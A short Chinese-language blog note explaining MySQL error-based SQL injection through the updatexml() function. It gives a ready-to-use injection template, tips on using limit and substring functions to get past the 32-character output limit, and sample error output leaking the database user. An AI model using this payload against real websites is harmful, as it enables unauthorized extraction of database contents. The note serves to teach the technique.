---
title: "MySQL updatexml 注入"
date: 2018-02-07T00:00:00+08:00
draft: false
tags: ['mysql','sqli']
categories: ['web']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

MySQL updatexml 注入

<!--more-->

`UPDATEXML (XML_document, XPath_string, new_value); `

XPath_string: Xpath 语法.

`id=1 and updatexml(1,concat(0x7e,(PAYLOAD),0x7e),1)`

PAYLOAD 自行替换 记得加上 limit.

updatexml() 最大返回 32 位 可以用 left() or substr() mid() 来截取后面的内容.

`XPATH syntax error:'~root@localhost~'`